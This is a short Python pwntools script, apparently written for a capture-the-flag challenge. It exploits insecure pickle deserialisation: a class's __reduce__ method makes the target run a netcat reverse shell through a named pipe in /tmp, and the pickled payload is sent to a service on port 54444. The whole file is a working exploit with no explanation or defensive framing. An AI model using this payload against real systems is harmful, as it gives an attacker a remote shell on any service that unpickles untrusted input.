#!/usr/bin/env python2

from pwn import *

import pickle
import os

RHOST = "127.0.0.1"
RPORT = 1337

context.log_level = "DEBUG"

class payload(object):
    def __reduce__(self):
        comm = "rm /tmp/shell; mknod /tmp/shell p; nc {rhost} {rport} 0</tmp/shell | /bin/sh 1>/tmp/shell".format(rhost=RHOST, rport=RPORT)
        log.debug("comm: %s"%comm)
        return (os.system, (comm,))

payload = pickle.dumps(payload())
log.info("Payload: %s"%payload)

p = remote("127.0.0.1", 54444)
p.sendline(payload)

